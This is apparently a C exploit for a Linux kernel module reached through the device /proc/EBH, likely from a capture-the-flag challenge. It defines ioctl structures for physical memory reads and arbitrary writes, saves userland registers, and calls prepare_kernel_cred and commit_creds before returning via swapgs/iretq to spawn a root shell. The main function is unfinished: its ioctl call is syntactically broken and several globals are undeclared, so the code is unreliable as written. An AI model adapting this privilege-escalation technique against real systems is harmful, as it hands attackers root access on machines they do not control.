#include<stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <assert.h>
#include <string.h>
#include <stdint.h>

#define GET_PHYSICAL _IO('G', 0)
#define PEEK_PHYSICAL _IO('P', 0)
#define WRITE_TO_ADDRESS _IO('W', 0)
#define WRITE_NOTE _IO('W', 1)

struct PeekPhysicalData {
    void *phyaddr;
    unsigned long peeksize;
    void *peekdata;
};

struct WriteToAddrData {
    void *target;
    void *src;
    unsigned long size;
};

struct WriteNoteData {
    void *src;
    unsigned long size;
};

void save_userland_state() {
    puts("[*] saving user land state");
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
}

void spawn_shell() {
    puts("[+] returned to user land");
    uid_t uid = getuid();
    if (uid == 0) {
        printf("[+] got root (uid = %d)\n", uid);
    } else {
        printf("[!] failed to get root (uid: %d)\n", uid);
        exit(-1);
    }
    puts("[*] spawning shell");
    system("/bin/sh");
    exit(0);
}

void privesc() {
    __asm__(".intel_syntax noprefix;"
            "movabs rax, prepare_kernel_cred;"
            "xor rdi, rdi;"
            "call rax;"
            "mov rdi, rax;"
            "movabs rax, commit_creds;"
            "call rax;"
            "swapgs;"
            "mov r15, user_ss;"
            "push r15;"
            "mov r15, user_sp;"
            "push r15;"
            "mov r15, user_rflags;"
            "push r15;"
            "mov r15, user_cs;"
            "push r15;"
            "mov r15, user_rip;"
            "push r15;"
            "iretq;"
            ".att_syntax;");
}

int main(int argc, char **argv) {
    int fd ;

    fd = open("/proc/EBH",2);
    assert(fd > 0);
    ioctl(fd,GET_PHYSICAL,);


}